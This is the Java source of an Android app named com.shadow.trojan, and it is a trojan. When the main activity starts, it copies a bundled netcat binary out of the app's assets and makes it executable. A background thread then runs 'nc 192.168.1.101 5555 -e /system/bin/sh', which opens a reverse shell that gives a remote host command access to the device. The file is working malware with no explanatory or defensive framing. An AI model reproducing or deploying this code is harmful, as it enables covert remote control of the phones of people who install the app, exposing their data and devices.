package com.shadow.trojan;

import androidx.appcompat.app.AppCompatActivity;
import android.content.res.AssetManager;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;

public class MainActivity extends AppCompatActivity {

    PrintWriter out;
    BufferedReader in;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        copyFile("nc");
        changePermissions("nc");
        getReverseShell();

    }


    private void copyFile(String filename) {

        AssetManager assetManager = this.getAssets();

        InputStream in = null;
        OutputStream out = null;

        try {

            in = assetManager.open(filename);

            File files = getApplicationContext().getDir("files", getApplicationContext().MODE_PRIVATE);
            files.mkdirs();

            String newFilename = "/data/data/" + this.getPackageName() + "/app_files/" + filename;
            out = new FileOutputStream(newFilename);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {

                out.write(buffer, 0, read);
            }

            in.close();
            in = null;
            out.flush();
            out.close();
            out = null;

        } catch (Exception e) {

            Log.e("ERROR", e.getMessage());
        }

    }

    private void changePermissions(String filename) {

        try {

            String cmd[] = {"/system/bin/sh", "-c", "chmod 755 /data/data/" + this.getPackageName() + "/app_files/" + filename};
            Runtime.getRuntime().exec(cmd);

        } catch (Exception e) {

            Log.e("ERROR", e.getMessage());
        }
    }

    private void getReverseShell() {

        Thread thread = new Thread() {

            @Override
            public void run() {

                try {
                    String cmd[] = {"/system/bin/sh", "-c", "/data/data/com.shadow.trojan/app_files/nc 192.168.1.101 5555 -e /system/bin/sh"};
                    Runtime.getRuntime().exec(cmd);
                } catch (Exception e) {

                    e.printStackTrace();
                }

            }

        };
        thread.start();

    }

}